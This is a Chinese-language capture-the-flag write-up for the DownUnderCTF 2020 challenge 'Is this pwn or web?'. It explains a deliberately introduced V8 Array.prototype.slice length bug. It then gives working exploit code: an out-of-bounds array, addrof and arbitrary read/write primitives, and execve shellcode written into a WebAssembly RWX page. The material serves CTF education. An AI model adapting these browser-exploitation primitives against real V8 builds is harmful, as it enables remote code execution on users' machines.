# DownUnderCTF 2020 - Is this pwn or web?

## 题目简述

服务接收一份不超过 100 KiB 的 JavaScript，交给定制的 V8 8.7.9 `d8` 执行。题目移除了 `d8` 的文件读写全局对象和动态模块导入，因此不能直接从 JavaScript 读取 flag；目标是在 V8 进程中取得原生代码执行，再运行 `/home/ctf/flagprinter`。

附件没有官方 WP，但 `challenge.tar.gz` 中保留了 `patch.diff`，可与公开的完整 exploit 交叉核对。漏洞来自对 `Array.prototype.slice` 快速路径的定制修改，而不是 Web 应用逻辑，所以应归类为 Pwn。

## 解题过程

补丁先正常提取数组，再用错误公式覆盖返回数组的长度：

```diff
- return ExtractFastJSArray(context, a, start, count);
+ const array: JSArray = ExtractFastJSArray(context, a, start, count);
+ const newLength: Smi = Cast<Smi>(count - start + SmiConstant(2))
+     otherwise Bailout;
+ array.ChangeLength(newLength);
+ return array;
```

`count` 已经是切片结果的元素数，正常长度应当就是 `count`。补丁却再次减去 `start` 并加 2，使 JSArray 的逻辑长度与实际 backing store 容量不一致。例如：

```javascript
let a = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6];
let oob = a.slice(4, 5);
```

这里 `start=4`、`count=1`，错误公式得到 `-1`。该内部 Smi 长度破坏后，数组下标访问可越过真实的 `FixedDoubleArray`，形成 OOB 读写。公开解法将一个 `BigUint64Array` 紧邻放置，并搜索哨兵值以定位两者的相对偏移：

```javascript
let oob = [1.1, 1.2, 1.3, 1.4, 1.5, 1.6].slice(4, 5);
let oob_rw = new BigUint64Array([
  0x1111111122222222n,
  0x1111111122222222n,
  0x1111111122222222n,
]);

let idx = -1;
for (let i = 0; i < 0x100; i++) {
  if (oob[i] === i2f(0x1111111122222222n)) {
    idx = i;
    break;
  }
}
```

其中 `i2f`/`f2i` 通过同一个 8 字节 `ArrayBuffer` 在 `Float64Array` 与 `BigUint64Array` 之间重解释位模式。找到 `idx` 后，利用 OOB 修改相邻 TypedArray 的长度、map 和外部指针，逐步建立以下原语：

1. 泄露 V8 压缩指针所在的 4 GiB cage 基址；
2. 在对象数组与整数/浮点数组的 map 之间切换，实现 `addrof(obj)`；
3. 覆盖 TypedArray 的 external pointer，实现任意地址读写 `read(addr)`、`write(addr, value)`。

该构建的固定 map 偏移为：

```javascript
obj_map  = base + 0x824394dn;
bint_map = base + 0x8242665n;
```

这些常量只适用于题目给定的 V8 提交 `47054c840e26394dea0e36df47884202a15dd16d`，不能照搬到其他构建。公开 exploit 的核心切换逻辑为：

```javascript
function addrof(obj) {
  oob[idx + 3] = i2f(obj_map);
  oob_rw[0] = obj;
  oob[idx + 3] = i2f(bint_map);
  return base + (oob_rw[0] & 0xffffffffn);
}

function read(addr) {
  oob[idx + 8] = i2f(addr);
  oob[idx + 9] = i2f(0n);
  return oob_rw[0];
}

function write(addr, value) {
  oob[idx + 8] = i2f(addr);
  oob[idx + 9] = i2f(0n);
  oob_rw[0] = value;
}
```

最后实例化一个最小 WebAssembly 模块。题目版本会为其生成一块可执行代码区；通过 `addrof` 和任意读取得该 RWX 地址，将执行 `/home/ctf/flagprinter` 的 amd64 shellcode写入，再调用导出的 Wasm 函数即可跳入 shellcode：

```javascript
let wasm_instance = new WebAssembly.Instance(
  new WebAssembly.Module(wasm_code), {}
);
let run = wasm_instance.exports.hello;

let wasm_addr = addrof(wasm_instance);
let rwx = read(wasm_addr - 1n + 8n * 13n);
write_bytes(rwx, shellcode);
run();
```

shellcode 字节可离线生成，避免手工编码路径：

```python
from pwn import asm, context, shellcraft

context.arch = "amd64"
code = asm(shellcraft.execve("/home/ctf/flagprinter", 0, 0))
print(list(code))
```

将完整脚本长度和脚本本体按服务提示提交后，`flagprinter` 输出：

```text
DUCTF{y0u_4r3_a_futUR3_br0ws3r_pwn_pr0d1gy!!}
```

仓库没有提供官方 exploit；上述原语链与固定偏移参考了[公开完整解题脚本](https://github.com/vakzz/ctfs/blob/master/DownUnder2020/Is%20this%20pwn%20or%20web%3F/solv.js)，关键漏洞公式、运行器限制和最终 flag 均已在题目附件中独立核验。

## 方法总结

本题的完整链路是“错误的 `slice` 长度 → JSArray OOB → 泄露压缩指针基址 → TypedArray 任意读写 → 覆盖 WebAssembly RWX 页 → 原生代码执行”。浏览器利用题首先应 diff 题目补丁，再把漏洞转化为稳定的地址泄露和任意读写原语；所有对象偏移都与指定 V8 构建绑定，必须在给定二进制上验证。
